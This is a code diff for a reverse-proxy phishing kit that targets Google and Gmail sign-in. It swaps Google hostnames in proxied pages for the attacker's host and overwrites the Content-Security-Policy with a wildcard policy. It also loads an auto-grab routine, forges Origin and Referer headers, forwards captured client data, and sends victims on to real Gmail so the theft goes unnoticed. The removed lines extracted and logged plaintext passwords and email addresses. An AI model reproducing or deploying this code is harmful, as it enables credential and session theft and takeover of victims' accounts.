@@ -22,7 +22,24 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
 
     constructor(proxyResp, browserEndPoint) {
         super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
-        this.regexes = []
+        this.regexes = [
+            {
+                reg: /accounts\.google\.com/igm,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /www\.google\.com/igm,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /gstatic\.com/igm,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/igm,
+                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
+            }
+        ]
     }
 
     processResponse(clientContext) {
@@ -35,11 +52,23 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             return this.proxyResp.pipe(this.browserEndPoint)
         }
 
+        const extRedirectObj = super.getExternalRedirect()
+        if (extRedirectObj !== null) {
+            const rLocation = extRedirectObj.url
+
+            if (rLocation.startsWith('https://myaccount.google.com') || 
+                rLocation.startsWith('https://accounts.google.com/signin/oauth') ||
+                rLocation.startsWith('https://mail.google.com')) {
+                return this.afterEmailPath()
+            }
+        }
+
         return super.processResponse(clientContext)
     }
 
-    concludeAuth() {
-        console.log('Gmail login completed successfully')
+    afterEmailPath() {
+        this.browserEndPoint.setHeader('location', '/auth/gmail/finish')
+        this.browserEndPoint.end('')
     }
 }
 
@@ -53,154 +82,33 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
-        // Handle Gmail login flow - direct approach
-        console.log('Gmail DefaultPreHandler.execute() called!')
-        console.log('Gmail request:', this.req.url, this.req.method)
-        console.log('Gmail request host:', this.req.headers.host)
-        console.log('Gmail request origin:', this.req.headers.origin)
-        
-        // For POST requests to password endpoint, capture password and forward to Gmail
-        if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/challenge/pwd')) {
-            let body = ''
-            this.req.on('data', (chunk) => {
-                body += chunk.toString()
-            })
-            this.req.on('end', () => {
-                // Extract password from form data
-                const passwordMatch = /password=([^&]+)/.exec(body)
-                if (passwordMatch) {
-                    const password = decodeURIComponent(passwordMatch[1])
-                    console.log('Password captured:', password)
-                    Object.assign(clientContext.sessionBody, { password: password })
-                }
-                
-                // Forward the request to Gmail with proper headers
-                const requestOptions = {
-                    hostname: 'accounts.google.com',
-                    port: 443,
-                    path: this.req.url,
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Content-Length': body.length,
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                        'Origin': this.req.headers.origin || `https://${this.req.headers.host}`,
-                        'Referer': this.req.headers.referer || `https://${this.req.headers.host}/`,
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Accept-Encoding': 'gzip, deflate, br, zstd',
-                        'Cache-Control': 'max-age=0',
-                        'Sec-Fetch-Dest': 'document',
-                        'Sec-Fetch-Mode': 'navigate',
-                        'Sec-Fetch-Site': 'same-origin',
-                        'Sec-Fetch-User': '?1',
-                        'Upgrade-Insecure-Requests': '1',
-                        'Cookie': this.req.headers.cookie || '',
-                        'Host': 'accounts.google.com'
-                    }
-                }
-                
-                const https = require('https')
-                const gmailReq = https.request(requestOptions, (gmailRes) => {
-                    console.log('Gmail password response data:', gmailRes.data)
-                    
-                    // Forward Gmail response to user
-                    this.res.writeHead(gmailRes.statusCode, gmailRes.headers)
-                    gmailRes.pipe(this.res)
-                })
-                
-                gmailReq.on('error', (err) => {
-                    console.error('Gmail password request error:', err)
-                    this.res.writeHead(500)
-                    this.res.end('Error connecting to Gmail')
-                })
-                
-                gmailReq.write(body)
-                gmailReq.end()
-            })
-            return
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
+        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
+        this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'accounts.google.com') : ''
+        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'accounts.google.com') : ''
+
+        // Check for redirect
+        const redirectToken = this.checkForRedirect()
+        if (redirectToken !== null) {
+            if (redirectToken.url.startsWith('https://myaccount.google.com') ||
+                redirectToken.url.startsWith('https://mail.google.com') ||
+                redirectToken.url.startsWith('https://accounts.google.com/signin/oauth')) {
+                super.sendClientData(clientContext, {})
+                return super.exitLink('https://mail.google.com')
+            }
+
+            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+            this.req.url = reqCheck
+            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
         }
 
-        // For POST requests to identifier endpoint, capture email and forward to Gmail
-        if (this.req.method === 'POST' && this.req.url.includes('/v3/signin/identifier')) {
-            console.log('Gmail POST request to identifier endpoint detected')
-            let body = ''
-            this.req.on('data', (chunk) => {
-                body += chunk.toString()
-            })
-            this.req.on('end', () => {
-                // Extract email from form data
-                const emailMatch = /identifier=([^&]+)/.exec(body)
-                if (emailMatch) {
-                    const email = decodeURIComponent(emailMatch[1])
-                    console.log('Email captured:', email)
-                    Object.assign(clientContext.sessionBody, { email: email })
-                }
-                
-                // Forward the request to Gmail with proper headers
-                const requestOptions = {
-                    hostname: 'accounts.google.com',
-                    port: 443,
-                    path: this.req.url,
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Content-Length': body.length,
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                        'Origin': this.req.headers.origin || `https://${this.req.headers.host}`,
-                        'Referer': this.req.headers.referer || `https://${this.req.headers.host}/`,
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Accept-Encoding': 'gzip, deflate, br, zstd',
-                        'Cache-Control': 'max-age=0',
-                        'Sec-Fetch-Dest': 'document',
-                        'Sec-Fetch-Mode': 'navigate',
-                        'Sec-Fetch-Site': 'same-origin',
-                        'Sec-Fetch-User': '?1',
-                        'Upgrade-Insecure-Requests': '1',
-                        'Cookie': this.req.headers.cookie || '',
-                        'Host': 'accounts.google.com'
-                    }
-                }
-                
-                console.log('Headers being sent to Gmail:', requestOptions.headers)
-                const https = require('https')
-                const gmailReq = https.request(requestOptions, (gmailRes) => {
-                    console.log('Gmail response status:', gmailRes.statusCode, gmailRes.statusMessage)
-                    
-                    // If Gmail redirects to password form, follow the redirect
-                    if (gmailRes.statusCode === 302 && gmailRes.headers.location) {
-                        const redirectUrl = gmailRes.headers.location
-                        console.log('Gmail redirect:', redirectUrl)
-                        
-                        if (redirectUrl.includes('/v3/signin/challenge/pwd')) {
-                            // Redirect to password form
-                            this.res.writeHead(302, {
-                                'Location': redirectUrl.replace('https://accounts.google.com', '')
-                            })
-                            this.res.end()
-                            return
-                        }
-                    }
-                    
-                    // Forward Gmail response to user
-                    this.res.writeHead(gmailRes.statusCode, gmailRes.headers)
-                    gmailRes.pipe(this.res)
-                })
-                
-                gmailReq.on('error', (err) => {
-                    console.error('Gmail request error:', err)
-                    this.res.writeHead(500)
-                    this.res.end('Error connecting to Gmail')
-                })
-                
-                gmailReq.write(body)
-                gmailReq.end()
-            })
-            return
+        if (this.req.url === '/auth/gmail/finish') {
+            super.sendClientData(clientContext, {})
+            this.res.writeHead('301', { location: 'https://mail.google.com' })
+            return super.cleanEnd('PHP-EXEC', clientContext)
         }
-        
-        // For all other requests, use default handling
+
         return super.execute(clientContext)
     }
 }
@@ -218,9 +126,15 @@ const configExport = {
 
     EXIT_TRIGGER_PATH: [],
 
-    EXIT_URL: 'https://myaccount.google.com/',
+    EXIT_URL: 'https://mail.google.com/',
 
     EXTRA_COMMANDS: [],
+
+    EXTERNAL_FILTERS: [
+        'accounts.google.com',
+        'www.google.com',
+        'gstatic.com'
+    ],
 
     PRE_HANDLERS: [],
     PROXY_REQUEST: ProxyRequest,
